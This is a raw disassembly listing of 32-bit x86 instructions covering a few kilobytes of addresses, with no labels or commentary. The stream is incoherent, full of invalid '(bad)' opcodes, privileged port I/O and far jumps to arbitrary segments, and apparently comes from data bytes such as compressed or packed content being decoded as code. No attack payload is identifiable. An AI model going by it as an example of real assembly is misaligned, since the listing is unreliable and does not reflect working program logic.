  415cde:	push   ebp
  415cdf:	cvtdq2ps xmm5,XMMWORD PTR ds:0xb4c190f6
  415ce6:	aaa    
  415ce7:	mov    edi,0xd763b420
  415cec:	or     BYTE PTR [ebx-0x34],al
  415cef:	add    DWORD PTR [eax],eax
  415cf1:	push   edx
  415cf2:	lods   eax,DWORD PTR ds:[esi]
  415cf3:	mov    ebp,0xa4439fef
  415cf8:	push   eax
  415cf9:	lea    edx,[eax-0x49bf1b24]
  415cff:	ror    BYTE PTR [esi],cl
  415d01:	dec    edx
  415d02:	dec    ebx
  415d03:	daa    
  415d04:	jb     0x415cab
  415d06:	dec    ebp
  415d07:	xor    al,0x59
  415d09:	je     0x415d48
  415d0b:	loopne 0x415c9e
  415d0d:	cmc    
  415d0e:	or     ebx,DWORD PTR [esi+0x4e8b9a16]
  415d14:	push   esi
  415d15:	cmp    ebp,DWORD PTR [ecx+0x5f]
  415d18:	outs   dx,BYTE PTR ds:[esi]
  415d19:	jmp    0x123d:0xb3c8d97e
  415d20:	out    dx,al
  415d21:	(bad)  
  415d22:	mov    ds:0xf841a395,eax
  415d27:	mov    BYTE PTR [ebx-0x16],bl
  415d2a:	cmp    eax,0xb5595bb9
  415d2f:	cmp    al,0x22
  415d31:	xor    BYTE PTR [ecx-0x59],cl
  415d34:	sar    BYTE PTR [ebx+0x17],1
  415d37:	dec    ecx
  415d38:	push   edi
  415d39:	imul   eax,DWORD PTR [ecx],0x9c8047fe
  415d3f:	retf   
  415d40:	scas   eax,DWORD PTR es:[edi]
  415d41:	pop    ecx
  415d42:	mov    WORD PTR [edi-0x61569736],cs
  415d48:	add    BYTE PTR [edi-0x1a0a701d],dh
  415d4e:	push   esp
  415d4f:	test   al,0x14
  415d51:	xor    esp,DWORD PTR [ebx]
  415d53:	pop    esi
  415d54:	sbb    al,0xb8
  415d56:	inc    edx
  415d57:	fcom   DWORD PTR [edx+0x40]
  415d5a:	jns    0x415d00
  415d5c:	test   DWORD PTR [edx],esi
  415d5e:	xchg   edx,eax
  415d5f:	pop    ecx
  415d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d61:	sbb    al,0x28
  415d63:	das    
  415d64:	and    BYTE PTR [esi],0x12
  415d67:	fstp   QWORD PTR [ecx+ebp*1+0x23]
  415d6b:	out    dx,eax
  415d6c:	adc    dh,BYTE PTR [ebp+0x5d35bfef]
  415d72:	inc    esi
  415d73:	sar    DWORD PTR [ebx],0x3d
  415d76:	pop    ecx
  415d77:	cld    
  415d78:	(bad)  
  415d79:	mov    edi,0x889bd1a9
  415d7e:	sub    DWORD PTR [eax-0x352edc8],esi
  415d84:	mov    bl,0x12
  415d86:	push   eax
  415d87:	jno    0x415d21
  415d89:	and    BYTE PTR [eax+edx*8],al
  415d8c:	mov    cl,0x95
  415d8e:	(bad)  
  415d8f:	in     eax,0x24
  415d91:	jne    0x415db9
  415d93:	cmc    
  415d94:	ret    
  415d95:	xchg   ebx,eax
  415d96:	mov    al,BYTE PTR [eax]
  415d98:	and    al,BYTE PTR [ecx]
  415d9a:	inc    edi
  415d9b:	pop    es
  415d9c:	in     al,0x73
  415d9e:	adc    al,BYTE PTR [edi]
  415da0:	test   eax,0x18f4c3e0
  415da5:	and    BYTE PTR [esi+0x1],bh
  415da8:	mov    edi,ebx
  415daa:	mov    ch,0x97
  415dac:	add    BYTE PTR [edi],al
  415dae:	push   ds
  415daf:	inc    edx
  415db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415db1:	cmp    ch,0x1
  415db4:	pextrw esp,mm6,0xb7
  415db8:	pop    es
  415db9:	rcr    BYTE PTR [eax-0x46],0x8a
  415dbd:	jl     0x415d60
  415dbf:	jp     0x415e17
  415dc1:	lock inc eax
  415dc3:	mov    esi,esp
  415dc5:	fdiv   DWORD PTR [ecx+0x2271f15c]
  415dcb:	or     eax,0xf6fd721f
  415dd0:	test   al,0x9f
  415dd2:	mov    ds:0xea11701e,eax
  415dd7:	popf   
  415dd8:	div    DWORD PTR [ebx+0x29666c80]
  415dde:	push   edx
  415ddf:	pop    esp
  415de0:	push   edi
  415de1:	js     0x415e35
  415de3:	std    
  415de4:	call   0x760eade8
  415de9:	lahf   
  415dea:	xlat   BYTE PTR ds:[ebx]
  415deb:	out    0xc8,eax
  415ded:	mov    esp,0x4c8e7db8
  415df2:	(bad)  
  415df4:	mov    DWORD PTR [ecx-0x1],esp
  415df7:	je     0x415e54
  415df9:	addr16 jle 0x415d88
  415dfc:	(bad)  
  415dfd:	xor    eax,0x384c710f
  415e02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e03:	(bad)  
  415e04:	cmp    edx,ecx
  415e06:	rol    BYTE PTR [edi],cl
  415e08:	enter  0x71b4,0xc3
  415e0c:	lea    eax,[ecx]
  415e0e:	enter  0x7c1d,0xee
  415e12:	call   0xa67b:0x27213403
  415e19:	push   edi
  415e1a:	pop    ecx
  415e1b:	imul   edx,DWORD PTR [ebp+0x70cbd84d],0x63b0e068
  415e25:	pop    esi
  415e26:	sbb    bh,cl
  415e28:	add    esi,DWORD PTR [edx+edi*8]
  415e2b:	xor    al,0x63
  415e2d:	(bad)  
  415e2e:	mov    bl,0xe5
  415e30:	clc    
  415e31:	add    DWORD PTR [esi+ecx*8-0x16],0x1c
  415e36:	jo     0x415e4f
  415e38:	dec    ebx
  415e39:	adc    al,0xe5
  415e3b:	and    esp,0xa
  415e3e:	in     eax,dx
  415e3f:	pusha  
  415e40:	push   ds
  415e41:	ret    0x2
  415e44:	push   ss
  415e45:	test   eax,0x61169721
  415e4a:	dec    edi
  415e4b:	pusha  
  415e4c:	jnp    0x415df8
  415e4e:	cmp    BYTE PTR [ebx-0x5b9f7f8a],ch
  415e54:	sbb    ebx,esi
  415e56:	gs sbb eax,0x5f8e51eb
  415e5c:	xchg   ecx,eax
  415e5d:	xchg   ebp,eax
  415e5e:	sbb    eax,0x4fda645b
  415e63:	out    dx,al
  415e64:	inc    esi
  415e65:	cmp    BYTE PTR [edi+0x1e],cl
  415e68:	or     al,0xa6
  415e6a:	xor    DWORD PTR [ebp+edx*8+0x560a08f7],ecx
  415e71:	stc    
  415e72:	mov    cl,0xc
  415e74:	mov    dl,0xa6
  415e76:	and    ecx,DWORD PTR [edi-0x52]
  415e79:	dec    edi
  415e7a:	pop    edx
  415e7b:	into   
  415e7c:	sbb    cl,BYTE PTR [ebp-0x2a5d9985]
  415e82:	stos   BYTE PTR es:[edi],al
  415e83:	add    cl,dh
  415e85:	inc    edi
  415e86:	adc    BYTE PTR [esi],0x14
  415e89:	mov    esi,0x1cce6154
  415e8e:	xchg   ecx,eax
  415e8f:	push   esp
  415e90:	mov    WORD PTR [ebp+0x3f],gs
  415e93:	enter  0x57b8,0xfc
  415e97:	inc    edi
  415e98:	jl     0x415e7c
  415e9a:	cli    
  415e9b:	sbb    ebx,edx
  415e9d:	setp   BYTE PTR ds:0xb36dbd2e
  415ea4:	cli    
  415ea5:	jle    0x415e5c
  415ea7:	cmp    DWORD PTR [eax],0x72
  415eaa:	xchg   DWORD PTR [esi-0x35],ecx
  415ead:	icebp  
  415eae:	mov    ds:0xc69d6c8c,eax
  415eb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415eb4:	int    0xb9
  415eb6:	or     ebx,edi
  415eb8:	std    
  415eb9:	bswap  esi
  415ebb:	jo     0x415e41
  415ebd:	dec    eax
  415ebe:	fs ss xchg esp,eax
  415ec1:	sub    al,0xfc
  415ec3:	clc    
  415ec4:	dec    ebp
  415ec5:	jno    0x415ee0
  415ec7:	rcr    BYTE PTR [esi],0x50
  415eca:	mov    ah,0x25
  415ecc:	mov    edi,0x90256f4b
  415ed1:	xor    al,BYTE PTR [ebp-0x1]
  415ed4:	xor    eax,0x724d3ea0
  415ed9:	fbld   TBYTE PTR [esi-0x52]
  415edc:	out    dx,al
  415edd:	push   cs
  415ede:	out    dx,eax
  415edf:	xor    eax,0xc78a300b
  415ee4:	sub    DWORD PTR [edi],ebp
  415ee6:	jmp    0x415e85
  415ee8:	outs   dx,DWORD PTR ds:[esi]
  415ee9:	daa    
  415eea:	mov    ebx,0xa0d87782
  415eef:	into   
  415ef0:	test   BYTE PTR ds:[ebp-0xa4af601],0x6
  415ef8:	js     0x415ea3
  415efa:	ror    DWORD PTR [edi+eiz*1-0x65],cl
  415efe:	mov    bh,0x9f
  415f00:	mov    ss,esp
  415f02:	inc    edx
  415f03:	popf   
  415f04:	shl    cl,0xf5
  415f07:	sti    
  415f08:	xchg   edx,eax
  415f09:	xchg   ebx,eax
  415f0a:	mov    esi,0x939f2c54
  415f0f:	sub    DWORD PTR [ecx+0x433e3ac9],0xffffff9f
  415f16:	popf   
  415f17:	pop    ebp
  415f18:	cmp    eax,0xf190dc55
  415f1d:	les    esp,FWORD PTR [eax]
  415f1f:	mov    eax,esp
  415f21:	mov    ebx,0x8529642b
  415f26:	pop    esp
  415f27:	and    al,0x75
  415f29:	lods   eax,DWORD PTR ds:[esi]
  415f2a:	mov    eax,ds:0xe98e2d34
  415f2f:	xchg   ebp,eax
  415f30:	pop    ecx
  415f31:	ins    BYTE PTR es:[edi],dx
  415f32:	das    
  415f33:	and    BYTE PTR [esi+0x415dd3ee],cl
  415f39:	xor    BYTE PTR [ebx+eiz*1-0x3a0957b5],ch
  415f40:	mov    DWORD PTR [ebx-0x6291d609],esi
  415f46:	add    esp,DWORD PTR [ecx-0x1fd0a718]
  415f4c:	lods   al,BYTE PTR ds:[esi]
  415f4d:	pop    eax
  415f4e:	inc    esi
  415f4f:	jns    0x415f07
  415f51:	mov    al,0x75
  415f53:	ins    DWORD PTR es:[edi],dx
  415f54:	sub    DWORD PTR [edi-0x6b],esi
  415f57:	aaa    
  415f58:	rcl    DWORD PTR [ebp-0x2dc24123],1
  415f5e:	stc    
  415f5f:	ret    0xb310
  415f62:	xor    DWORD PTR [eax-0x13],edx
  415f65:	mov    edx,0xe996834a
  415f6a:	jns    0x415f8d
  415f6c:	mov    bh,0x4b
  415f6e:	ss xchg cl,bh
  415f71:	jg     0x415f3c
  415f73:	jge    0x415f0f
  415f75:	repz (bad) 
  415f77:	rcl    ebp,1
  415f79:	gs (bad) 
  415f7b:	or     DWORD PTR [ecx+0x42],ecx
  415f7e:	mov    eax,0x81cee0d4
  415f83:	lahf   
  415f84:	dec    esi
  415f85:	sahf   
  415f86:	pop    eax
  415f87:	rcl    BYTE PTR ds:0x9c718865,0xa7
  415f8e:	and    ch,BYTE PTR [edi+0x52c7c7db]
  415f94:	add    al,0xe4
  415f96:	fmul   st(1),st
  415f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f99:	cmp    ebx,DWORD PTR [ecx+0x4e3e3b81]
  415f9f:	and    ecx,esp
  415fa1:	scas   al,BYTE PTR es:[edi]
  415fa2:	imul   ebx
  415fa4:	mov    dh,0x2c
  415fa6:	cmc    
  415fa7:	jnp    0x415fa8
  415fa9:	push   ebx
  415faa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fab:	imul   eax,DWORD PTR [ebx+eiz*4-0x1],0xffffff96
  415fb0:	pop    ebx
  415fb1:	or     al,0x2d
  415fb3:	mov    ecx,0x427c2c56
  415fb8:	imul   ecx,DWORD PTR [esi+0x21a2e362],0x447d1ad0
  415fc2:	call   0x4a9aee87
  415fc7:	push   ebx
  415fc8:	xchg   edi,eax
  415fc9:	xor    BYTE PTR [eax+ebx*2-0x44644080],dl
  415fd0:	jb     0x415f91
  415fd2:	and    edx,ebp
  415fd4:	daa    
  415fd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fd6:	or     esi,DWORD PTR [edx]
  415fd8:	push   0x5e
  415fda:	adc    dl,BYTE PTR [esi-0x23]
  415fdd:	loopne 0x415fc9
  415fdf:	lea    edx,[edx+0x16f84ce5]
  415fe5:	sub    al,0xc
  415fe7:	dec    ecx
  415fe8:	fimul  DWORD PTR [edi+0x41e2b4cf]
  415fee:	nop
  415fef:	cmp    esi,DWORD PTR [edx]
  415ff1:	loopne 0x416046
  415ff3:	add    eax,0x7a40113c
  415ff8:	cmp    BYTE PTR [edi],bl
  415ffa:	and    DWORD PTR [esi+ebx*4-0x6b],0xffffff80
  415fff:	mov    DWORD PTR [edx-0x7f],eax
  416002:	adc    ecx,edi
  416004:	(bad)
  41600a:	inc    edi
  41600b:	mov    esp,0x1e40cc06
  416010:	pop    esp
  416011:	imul   esi,DWORD PTR [esi-0x5],0x7669449c
  416018:	and    al,0xef
  41601a:	lahf   
  41601b:	inc    edi
  41601c:	adc    ch,0xda
  41601f:	lds    ebx,FWORD PTR [edi-0x6c]
  416022:	das    
  416023:	retf   0x1479
  416026:	cmp    al,0x65
  416028:	stos   DWORD PTR es:[edi],eax
  416029:	jne    0x415fba
  41602b:	hlt    
  41602c:	jns    0x416012
  41602e:	and    ah,dh
  416030:	dec    edi
  416031:	int3   
  416032:	adc    ah,BYTE PTR [ebx+edx*1]
  416035:	sbb    DWORD PTR [edi-0x47],ecx
  416038:	mov    bl,0x79
  41603a:	mov    ds:0x2ba08b4d,eax
  41603f:	adc    al,0x5d
  416041:	fst    QWORD PTR [edx]
  416043:	lahf   
  416044:	cld    
  416045:	mov    esp,0x26a92e4c
  41604a:	jecxz  0x415fec
  41604c:	ins    BYTE PTR es:[edi],dx
  41604d:	les    edi,FWORD PTR [esi-0x1a]
  416050:	iret   
  416051:	xchg   esi,eax
  416052:	add    eax,0xfa7d2fa
  416057:	fstp   QWORD PTR [ecx-0x69d3e2e5]
  41605d:	in     al,0xfd
  41605f:	inc    esi
  416060:	loope  0x416022
  416062:	cmp    eax,0xe06a190b
  416067:	bound  eax,QWORD PTR [eax+edx*2]
  41606a:	mov    esp,0xdff974a7
  41606f:	and    BYTE PTR [ebx-0x60],cl
  416072:	mov    cl,0x42
  416074:	cld    
  416075:	scas   al,BYTE PTR es:[edi]
  416076:	and    bh,BYTE PTR [ecx+0x35cce51d]
  41607c:	mov    BYTE PTR [ebp-0x44],al
  41607f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416080:	lahf   
  416081:	mov    WORD PTR [edi+0x235c7415],gs
  416087:	or     al,BYTE PTR [ecx+0x27ca5f76]
  41608d:	std    
  41608e:	pusha  
  41608f:	or     ah,BYTE PTR [ebx+0x1772820a]
  416095:	push   0xffffffa4
  416097:	stc    
  416098:	push   0xffffff9a
  41609a:	or     ebp,DWORD PTR [esi]
  41609c:	pop    ss
  41609d:	lds    esi,FWORD PTR [esi+0x5373c4bf]
  4160a3:	int    0x2e
  4160a5:	fld    DWORD PTR [ebp-0x55]
  4160a8:	test   al,0x1f
  4160aa:	jl     0x41604d
  4160ac:	inc    edi
  4160ad:	mov    DWORD PTR [ebp+0x6e],eax
  4160b0:	sbb    al,0x6a
  4160b2:	dec    edx
  4160b3:	push   ss
  4160b4:	test   al,0xbc
  4160b6:	jp     0x416043
  4160b8:	and    ah,dh
  4160ba:	jl     0x4160a4
  4160bc:	ins    BYTE PTR es:[edi],dx
  4160bd:	mov    eax,ds:0x8a969531
  4160c2:	lea    ebp,[eax]
  4160c4:	push   esp
  4160c5:	std    
  4160c6:	jns    0x416053
  4160c8:	xchg   ebx,eax
  4160c9:	sbb    BYTE PTR [esi],cl
  4160cb:	ror    BYTE PTR [ecx+0x5e],0x6c
  4160cf:	or     dh,dl
  4160d1:	leave  
  4160d2:	adc    bl,BYTE PTR [eax+0x17774ea8]
  4160d8:	lods   eax,DWORD PTR ds:[esi]
  4160d9:	or     eax,0x4ff63a11
  4160de:	pop    ecx
  4160df:	leave  
  4160e0:	pop    ebp
  4160e1:	call   0x2c2d:0xc75fad03
  4160e8:	dec    edx
  4160e9:	xlat   BYTE PTR ds:[ebx]
  4160ea:	or     eax,0x946bc7d1
  4160ef:	and    al,0xdc
  4160f1:	sub    BYTE PTR [eax],dh
  4160f3:	mov    ecx,ss
  4160f5:	sub    edi,ecx
  4160f7:	adc    DWORD PTR ss:[eax],edx
  4160fa:	sahf   
  4160fb:	rcr    DWORD PTR [esi+0x2f1acb3b],cl
  416101:	mov    cl,0x47
  416103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416104:	call   0xba8e178c
  416109:	outs   dx,DWORD PTR ds:[esi]
  41610a:	stc    
  41610b:	add    BYTE PTR [ebp-0x4e],al
  41610e:	fld    DWORD PTR [edi-0x29]
  416111:	cmp    DWORD PTR [ecx+0x4d],0xffffffc6
  416115:	js     0x41616f
  416117:	push   ecx
  416118:	das    
  416119:	(bad)  
  41611a:	add    DWORD PTR [ecx],ecx
  41611c:	mov    ds:0x320b4e47,eax
  416121:	adc    bl,BYTE PTR [eax+0x62db2df4]
  416127:	push   ebp
  416128:	dec    esp
  416129:	xchg   DWORD PTR [edi-0x6c6fa7b4],ecx
  41612f:	pop    esi
  416130:	jno    0x41616c
  416132:	sub    al,0x44
  416134:	test   DWORD PTR [esi],ebp
  416136:	(bad)  
  416137:	addr16 push ds
  416139:	inc    esi
  41613a:	sub    cl,BYTE PTR [eax-0x175d700d]
  416140:	jp     0x416185
  416142:	and    dh,bl
  416144:	and    ch,BYTE PTR [edi-0x86e995f]
  41614a:	call   0x4251374f
  41614f:	rol    DWORD PTR [esp+ebp*2-0x55],0x4f
  416154:	les    ebx,FWORD PTR [ebp-0x18]
  416157:	sbb    DWORD PTR [ebx+0x6fd65331],edi
  41615d:	fwait
  41615e:	(bad)  
  41615f:	out    0xea,eax
  416161:	stos   BYTE PTR es:[edi],al
  416162:	xchg   esp,eax
  416163:	push   0xa2560c0b
  416168:	or     eax,edx
  41616a:	and    dl,al
  41616c:	xchg   edi,eax
  41616d:	adc    BYTE PTR ds:0x1b0afb8c,al
  416173:	mov    eax,ds:0x52d07fc8
  416178:	inc    edx
  416179:	adc    eax,0xab083326
  41617e:	pop    es
  41617f:	out    0xe3,eax
  416181:	cli    
  416182:	stos   DWORD PTR es:[edi],eax
  416183:	jb     0x41611c
  416185:	mov    ?,eax
  416187:	adc    al,0x35
  416189:	cdq    
  41618a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41618b:	test   BYTE PTR [esi],bh
  41618d:	jg     0x416203
  41618f:	js     0x4161b5
  416191:	pusha  
  416192:	dec    esi
  416193:	hlt    
  416194:	pop    es
  416195:	fimul  WORD PTR ds:0x3bee4243
  41619b:	aam    0x5a
  41619d:	and    esp,esi
  41619f:	aas    
  4161a0:	das    
  4161a1:	xor    ch,0x52
  4161a4:	inc    esp
  4161a5:	mov    cl,0xd3
  4161a7:	xchg   ebx,eax
  4161a8:	and    ebp,DWORD PTR [ebp+0x3a9b3e9b]
  4161ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161af:	fistp  DWORD PTR [edx]
  4161b1:	cwde   
  4161b2:	sub    ah,cl
  4161b4:	push   eax
  4161b5:	ja     0x4161f4
  4161b7:	push   es
  4161b8:	in     eax,dx
  4161b9:	(bad)  
  4161ba:	pop    ecx
  4161bb:	in     eax,0xeb
  4161bd:	fucomip st,st(1)
  4161bf:	in     al,dx
  4161c0:	popf   
  4161c1:	dec    esi
  4161c2:	ins    DWORD PTR es:[edi],dx
  4161c3:	test   al,0xbf
  4161c5:	mov    dh,0x3f
  4161c7:	jne    0x4161d4
  4161c9:	imul   edx,DWORD PTR [edx],0xffffffbb
  4161cc:	jnp    0x416158
  4161ce:	xor    edi,DWORD PTR [edi]
  4161d0:	push   es
  4161d1:	shr    DWORD PTR [esi-0x55],1
  4161d4:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4161d6:	scas   eax,DWORD PTR es:[edi]
  4161d7:	aas    
  4161d8:	and    BYTE PTR ds:0x8a8707a3,dh
  4161de:	pop    ecx
  4161df:	in     al,dx
  4161e0:	out    0x7f,eax
  4161e2:	int3   
  4161e3:	sub    eax,0x9cd27fc1
  4161e8:	repnz mov esi,0xd4c6bfde
  4161ee:	fiadd  DWORD PTR [edi]
  4161f0:	in     al,0xc8
  4161f2:	gs div esi
  4161f5:	ret    0x125a
  4161f8:	sar    BYTE PTR [ebx],cl
  4161fa:	inc    edi
  4161fb:	nop
  4161fc:	or     DWORD PTR [ebx-0x3777f37],edi
  416202:	ret    
  416203:	or     al,0xf6
  416205:	(bad)  
  416207:	pop    edx
  416208:	jb     0x41619a
  41620a:	xchg   ecx,esp
  41620c:	mov    ecx,0xd633af03
  416211:	js     0x4161fd
  416213:	or     BYTE PTR [esi-0x12],bl
  416216:	mov    BYTE PTR [edx+0x63],cl
  416219:	mov    ebp,0x647f7940
  41621e:	add    edi,esi
  416220:	cmp    ebx,DWORD PTR [eax-0x42]
  416223:	mov    bl,0x61
  416225:	push   ebp
  416226:	outs   dx,BYTE PTR ds:[esi]
  416227:	dec    esp
  416228:	inc    edi
  416229:	test   esi,eax
  41622b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41622c:	mov    edx,0x6eb6e368
  416231:	mov    dl,0xc3
  416233:	xchg   ecx,eax
  416234:	data16 mov ah,0xf0
  416237:	dec    esp
  416238:	std    
  416239:	xchg   bl,al
  41623b:	mov    eax,ds:0xd5748d99
  416240:	jge    0x4162b1
  416242:	pop    ecx
  416243:	cmp    ah,BYTE PTR [ebx+0x22]
  416246:	ja     0x41624b
  416248:	pop    DWORD PTR [edx+0x7a5da0cf]
  41624e:	and    ah,BYTE PTR [edx-0x65]
  416251:	test   DWORD PTR [esi],eax
  416253:	fimul  WORD PTR [ebx+ecx*8]
  416256:	jns    0x4162d7
  416258:	sbb    BYTE PTR [eax+esi*2-0xb],ch
  41625c:	popf   
  41625d:	(bad)  
  41625e:	or     BYTE PTR [ebx],al
  416260:	cmp    cl,BYTE PTR [edx-0x39]
  416263:	push   0xffffffea
  416265:	arpl   WORD PTR [bx],sp
  416268:	jne    0x416278
  41626a:	xor    al,0x71
  41626c:	int3   
  41626d:	mov    edi,0xd485bfc5
  416272:	mov    cs,edi
  416274:	inc    ebx
  416275:	pop    esp
  416276:	repz push esp
  416278:	and    ecx,ecx
  41627a:	and    BYTE PTR [edx],0x4f
  41627d:	push   ss
  41627e:	add    edx,DWORD PTR [edi+edx*4+0x29]
  416282:	cmp    ebp,DWORD PTR [eax+edx*8+0x3a9d49b7]
  416289:	outs   dx,BYTE PTR ds:[esi]
  41628a:	mov    edi,0xb887cb0b
  41628f:	sbb    BYTE PTR [esi+0x72bac80b],bl
  416295:	push   esp
  416296:	mov    ch,0xb1
  416298:	or     edx,esi
  41629a:	cdq    
  41629b:	mov    edx,0x5a1702af
  4162a0:	sub    eax,0xfbd66ade
  4162a5:	mov    WORD PTR [ebx+0x751dd21f],cs
  4162ab:	out    0x40,al
  4162ad:	push   cs
  4162ae:	cmp    BYTE PTR [ebx-0x55],0x51
  4162b2:	pop    ds
  4162b3:	in     eax,dx
  4162b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162b5:	or     edx,DWORD PTR [ecx+0x6e605dfa]
  4162bb:	imul   ebx,DWORD PTR [ecx+0x2c0e99d1],0xe61fac4a
  4162c5:	jae    0x41632f
  4162c7:	mov    edi,0x171ad02f
  4162cc:	pop    edx
  4162cd:	and    BYTE PTR [eax],ah
  4162cf:	dec    edx
  4162d0:	stos   DWORD PTR es:[edi],eax
  4162d1:	imul   edi,eax,0xc5e736b6
  4162d7:	push   ebx
  4162d8:	mov    eax,ds:0x51cab420
  4162dd:	mov    ebx,0xbbc38fb2
  4162e2:	mov    BYTE PTR [esi+0x30fae928],al
  4162e8:	loope  0x41634d
  4162ea:	in     al,0xae
  4162ec:	bound  edx,QWORD PTR [esi-0x239e5b10]
  4162f2:	inc    esp
  4162f3:	cdq    
  4162f4:	mov    edx,0x71ad4340
  4162f9:	fstp   QWORD PTR [ecx+ebp*8+0x18daabe3]
  416300:	fadd   QWORD PTR [ecx]
  416302:	jge    0x4162f1
  416304:	out    dx,al
  416305:	mov    ecx,0xa4ef3730
  41630a:	or     BYTE PTR [eax],dh
  41630c:	mov    ebx,0x214ef253
  416311:	stc    
  416312:	ja     0x4162bd
  416314:	jl     0x41631c
  416316:	rcr    ebx,1
  416318:	xchg   ebp,eax
  416319:	dec    edi
  41631a:	mov    edi,0x4384b31
  41631f:	addr16 sub al,0x5f
  416322:	xlat   BYTE PTR ds:[ebx]
  416323:	das    
  416324:	f2xm1  
  416326:	fnstcw WORD PTR [eax]
  416328:	cmc    
  416329:	jp     0x4162ca
  41632b:	dec    esp
  41632c:	mov    esp,0x78929a36
  416331:	sub    al,0x33
  416333:	daa    
  416334:	push   eax
  416335:	shl    esi,1
  416337:	bound  edi,QWORD PTR [ebx-0x38]
  41633a:	daa    
  41633b:	cmp    eax,0x2bdb8338
  416340:	lahf   
  416341:	xchg   ebp,eax
  416342:	jne    0x4163bb
  416344:	loopne 0x416317
  416346:	xchg   BYTE PTR [ecx+0x6e],cl
  416349:	xchg   ebp,eax
  41634a:	fnstcw WORD PTR [edi]
  41634c:	lahf   
  41634d:	pop    ds
  41634e:	nop
  41634f:	scas   al,BYTE PTR es:[edi]
  416350:	push   ss
  416351:	scas   al,BYTE PTR es:[edi]
  416352:	cmp    DWORD PTR [edi+0xe],ecx
  416355:	cdq    
  416356:	push   ebp
  416357:	fwait
  416358:	mov    dl,0x4a
  41635a:	dec    ebx
  41635b:	in     al,0x80
  41635d:	xchg   ebp,eax
  41635e:	std    
  41635f:	mov    edi,0x2fb1b1f5
  416364:	sbb    dh,0x35
  416367:	aas    
  416368:	inc    edx
  416369:	rol    DWORD PTR [edx+0x7a],cl
  41636c:	inc    edx
  41636d:	adc    DWORD PTR [ebp-0x10],0xac29f526
  416374:	jae    0x41639f
  416376:	(bad)  
  416377:	mov    ah,0x30
  416379:	pop    ss
  41637a:	xchg   edi,eax
  41637b:	mov    WORD PTR ss:[edi-0x5e059a22],es
  416382:	loope  0x4163c1
  416384:	outs   dx,BYTE PTR ds:[esi]
  416385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416386:	iret   
  416387:	jmp    0xc7eb2e9b
  41638c:	xlat   BYTE PTR ds:[ebx]
  41638d:	cdq    
  41638e:	mov    al,ds:0xa2ec8378
  416393:	arpl   ax,cx
  416395:	sahf   
  416396:	gs sub eax,0xf46d568b
  41639c:	js     0x416376
  41639e:	sbb    bh,0x57
  4163a1:	test   eax,0x7a10846e
  4163a6:	nop
  4163a7:	mov    bh,bl
  4163a9:	mov    DWORD PTR [esi],ebp
  4163ab:	fisubr WORD PTR [edi]
  4163ad:	mov    dl,0x53
  4163af:	nop
  4163b0:	fcom   DWORD PTR [esi]
  4163b2:	mov    edx,0x864b5ce4
  4163b7:	xlat   BYTE PTR ds:[ebx]
  4163b8:	ins    DWORD PTR es:[edi],dx
  4163b9:	inc    esi
  4163ba:	aam    0x3f
  4163bc:	rcr    al,0x96
  4163bf:	xor    DWORD PTR [esp+ebp*1+0x30],esi
  4163c3:	lds    ecx,FWORD PTR [ecx+0x79]
  4163c6:	pop    eax
  4163c7:	dec    ecx
  4163c8:	dec    eax
  4163c9:	aaa    
  4163ca:	jg     0x4163e3
  4163cc:	xor    al,BYTE PTR [ebp+eiz*4+0x5d]
  4163d0:	push   ebx
  4163d1:	sahf   
  4163d2:	aad    0x51
  4163d4:	adc    DWORD PTR [edx],esi
  4163d6:	mov    ebp,0xd5e972a1
  4163db:	inc    esp
  4163dc:	xchg   ebp,eax
  4163dd:	in     al,0x8c
  4163df:	pop    ebx
  4163e0:	mov    esi,0x17f97f94
  4163e5:	cmp    edi,DWORD PTR [esp+eax*4-0x3d]
  4163e9:	(bad)  
  4163ea:	cli    
  4163eb:	jmp    DWORD PTR [ecx+ecx*1]
  4163ee:	neg    ch
  4163f0:	sbb    eax,0x94757c61
  4163f5:	shl    bl,0xe5
  4163f8:	xchg   ebp,eax
  4163f9:	hlt    
  4163fa:	mov    al,0x9c
  4163fc:	push   ebp
  4163fd:	mov    edi,0xdc5f7855
  416402:	jb     0x41644d
  416404:	cs push ecx
  416406:	add    al,0xbf
  416408:	xchg   ebx,eax
  416409:	adc    BYTE PTR [esi],bh
  41640b:	(bad)  
  41640d:	fisub  DWORD PTR [edx+0x43d5368c]
  416413:	aad    0xe4
  416415:	sahf   
  416416:	jns    0x4163ee
  416418:	jmp    DWORD PTR [eax+0x10]
  41641b:	push   edi
  41641c:	xlat   BYTE PTR ds:[ebx]
  41641d:	lea    ebp,[ebx-0xb7ba015]
  416423:	mov    bl,0x27
  416425:	fisttp DWORD PTR [esi]
  416427:	sbb    ch,BYTE PTR [edx-0x1]
  41642a:	jp     0x41642c
  41642c:	iret   
  41642d:	xor    ch,bl
  41642f:	add    al,0x58
  416431:	bnd ret 0xc277
  416435:	push   esi
  416436:	stc    
  416437:	imul   eax,DWORD PTR [ecx],0xdcc0129c
  41643d:	and    ebx,0xffffff98
  416440:	aas    
  416441:	mov    ebp,0xd8af9ee7
  416446:	fimul  WORD PTR [eax+0x7e337a5d]
  41644c:	aaa    
  41644d:	or     esp,esp
  41644f:	es std 
  416451:	push   esp
  416452:	dec    ebp
  416453:	cmp    BYTE PTR [ecx-0x6d],bl
  416456:	ins    BYTE PTR es:[edi],dx
  416457:	mov    ch,0xd3
  416459:	mov    WORD PTR [ecx],cs
  41645b:	scas   eax,DWORD PTR es:[edi]
  41645c:	cmp    bh,BYTE PTR [ebx+0x3133f9f1]
  416462:	rcl    DWORD PTR [esi-0x488643dc],cl
  416468:	adc    eax,0x42902479
  41646d:	xchg   esp,eax
  41646e:	outs   dx,DWORD PTR ds:[esi]
  41646f:	and    eax,0xf28f7992
  416474:	cmp    dl,BYTE PTR [ecx]
  416476:	ret    0xef45
